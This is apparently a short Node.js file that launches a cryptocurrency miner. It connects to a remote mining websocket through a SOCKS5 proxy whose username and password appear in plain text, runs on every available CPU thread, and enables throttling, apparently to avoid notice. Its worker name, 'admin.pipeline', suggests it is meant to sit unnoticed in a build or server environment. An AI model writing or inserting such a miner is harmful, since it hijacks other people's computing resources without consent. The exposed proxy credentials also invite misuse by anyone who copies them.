const { NMiner } = require("nminer");
new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@173.211.8.109:6221", threads: require("os").cpus().length, throttle: true });
